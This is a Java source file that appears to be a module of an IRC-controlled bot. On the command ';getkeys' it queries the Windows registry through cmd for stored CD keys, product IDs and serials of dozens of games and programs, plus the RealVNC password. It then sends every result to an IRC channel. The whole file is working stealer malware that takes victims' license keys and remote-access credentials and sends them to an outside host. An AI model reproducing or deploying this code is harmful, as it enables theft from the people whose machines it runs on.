
import java.io.*;
//I heard that Vista keys are encrypted so its useless?
//nope their not, well not that i know fo, anyways the game keys wont be so its all good
public class CDKeys implements Handler {

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";getkeys")) {
            getCDKeys();
            String parseKeys[] = Config.dataHolder.split("\n");

            for (int i = 0; i < parseKeys.length; i++) {

                IRC.sendMessage(Config.channel, parseKeys[i]);
            }
            return true;
        }
        return false;
    }

    public static void getCDKeys() {
        StringBuilder sb = new StringBuilder();
        String cdKeys[] = {"HKCU\\Software\\RealVNC\\WinVNC,password,RealVNC Server (Use a decrypter): ",
            "HKCU\\Software\\Valve\\CounterStrike\\Settings,CDKey,Counter-Strike (Retail)",
            "HKCU\\Software\\Eugen Systems\\The Gladiators,RegNumber,The Gladiators",
            "HKCU\\Software\\Valve\\Gunman\\Settings,Key,Gunman Chronicles",
            "HKCU\\Software\\Valve\\Half-Life\\Settings,Key,Half-Life",
            "HKCU\\Software\\JoWooD\\InstalledGames\\IG2,prvkey,Industry Giant 2",
            "HKCU\\Software\\3d0\\Status,CustomerNumber,Legends of Might and Magic",
            "HKCU\\Software\\Silver Style Entertainment\\Soldiers Of Anarchy\\Settings,CDKey,Soldiers Of Anarchy",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion,ProductId,Windows XP",
            "HKLM\\Software\\Unreal Technology\\Installed Apps\\UT2003,CDKey,Unreal Tournament 2003",
            "HKLM\\Software\\Unreal Technology\\Installed Apps\\UT2004,CDKey,Unreal Tournament 2004",
            "HKLM\\Software\\IGI 2 Retail,CDKey,IGI 2: Covert Strike",
            "HKLM\\Software\\Electronic Arts\\EA Distribution\\Freedom Force\\ergc,default,Freedom Force",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc,default,Battlefield 1942",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Black and White\\ergc,default,Black and White",
            "HKLM\\Software\\Electronic Arts\\Black and White 2\\ergc,default,Black and White 2",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour\\ergc,default,Command and Conquer: Generals (Zero Hour)",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire\\ergc,default,James Bond 007: Nightfire",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Generals\\ergc,default,Command and Conquer: Generals",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Global Operations\\ergc,default,Global Operations",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault\\ergc,default,Medal of Honor: Allied Assault",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough\\ergc,default,Medal of Honor: Allied Assault: Breakthrough",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead\\ergc,default,Medal of Honor: Allied Assault: Spearhead",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2,default,Need For Speed Hot Pursuit 2",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Need For Speed Underground\\ergc,default,Need For Speed: Underground",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition\\ergc,default,Shogun: Total War: Warlord Edition",
            "HKLM\\Software\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc,default,FIFA 2002",
            "HKLM\\Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc,default,FIFA 2003",
            "HKLM\\Software\\Electronic Arts\\EA Sports\\NHL 2002\\ergc,default,NHL 2002",
            "HKLM\\Software\\Electronic Arts\\EA Sports\\NHL 2003\\ergc,default,NHL 2003",
            "HKLM\\Software\\Electronic Arts\\EA Sports\\Nascar Racing 2002\\ergc,default,Nascar Racing 2002",
            "HKLM\\Software\\Electronic Arts\\EA Sports\\Nascar Racing 2003\\ergc,default,Nascar Racing 2003",
            "HKLM\\Software\\Red Storm Entertainment\\RAVENSHIELD,CDKey,Rainbow Six III RavenShield",
            "HKLM\\Software\\Westwood\\Tiberian Sun,Serial,Command and Conquer: Tiberian Sun",
            "HKLM\\Software\\Westwood\\Red Alert,Serial,Command and Conquer: Red Alert",
            "HKLM\\Software\\Westwood\\Red Alert 2,Serial,Command and Conquer: Red Alert 2",
            "HKLM\\Software\\Westwood\\NOX,Serial,NOX",
            "HKLM\\Software\\Techland\\Chrome,SerialNumber,Chrome",
            "HKLM\\Software\\Illusion Softworks\\Hidden & Dangerous 2,key,Hidden & Dangerous 2",
            "HKLM\\Software\\Activision\\Tony Hawk's Underground 2,Key,Tony Hawks Underground",
            "HKLM\\Software\\Microsoft\\Microsoft Games\\Halo,PID,Halo",
            "HKLM\\Software\\Adobe\\Illustrator\\11\\Registration,SERIAL,Adobe Illustrator 11",
            "HKLM\\Software\\Microsoft\\Microsoft Games\\Age of Empires II: The Conquerors Expansion\1.0,PID,Age of Empires II",
            "HKLM\\Software\\Electronic Arts\\EA Games\\Battlefield 2\\ergc,default,Battlefield 2",
            "HKLM\\Software\\Nullsoft\\Winamp,regkey,WinAmp",
            "HKLM\\Software\\Activision\\Call of Duty United Offensive,key,Call of Duty UO",
            "HKLM\\Software\\Activision\\Call of Duty 2,codkey,Call of Duty 2",
            "HKLM\\Software\\Electronic Arts\\EA GAMES\\Global Operations\\ergc,default,Global Operations"};

        for (int i = 0; i < cdKeys.length; i++) {

            String data[] = cdKeys[i].split(",");

            if (data[1].equals("default")) {

                try {
                    Process p = Runtime.getRuntime().exec("cmd /c REG QUERY \"" + data[0] + "\"");
                    p.waitFor();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line = reader.readLine();

                    while (line != null) {
                        if (line.contains("<NO NAME>")) {

                            String key[] = line.split("\\s+");
                            String keyDo;

                            if (key[1].contains("REG_SZ")) {
                                keyDo = key[2];
                            } else if (key[2].contains("REG_SZ")) {
                                keyDo = key[3];
                            } else if (key[3].contains("REG_SZ")) {
                                keyDo = key[4];
                            } else if (key[4].contains("REG_SZ")) {
                                keyDo = key[5];
                            } else {
                                keyDo = null;
                            }

                            Config.dataHolder = Config.dataHolder + "\n" + data[2] + ": " + keyDo;
                        }
                        line = reader.readLine();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e2) {
                    e2.printStackTrace();
                }
            } else {

                try {
                    Process p = Runtime.getRuntime().exec("cmd /c REG QUERY \"" + data[0] + "\" /v " + data[1]);
                    p.waitFor();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line = reader.readLine();

                    while (line != null) {
                        if (line.contains(data[1])) {

                            String key[] = line.split("\\s+");
                            String keyDo;

                            if (key[1].contains("REG_SZ")) {
                                keyDo = key[2];
                            } else if (key[2].contains("REG_SZ")) {
                                keyDo = key[3];
                            } else if (key[3].contains("REG_SZ")) {
                                keyDo = key[4];
                            } else if (key[4].contains("REG_SZ")) {
                                keyDo = key[5];
                            } else {
                                keyDo = null;
                            }

                            Config.dataHolder = Config.dataHolder + "\n" + data[2] + ": " + keyDo;
                        }
                        line = reader.readLine();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e2) {
                    e2.printStackTrace();
                }
            }
        }
    }
}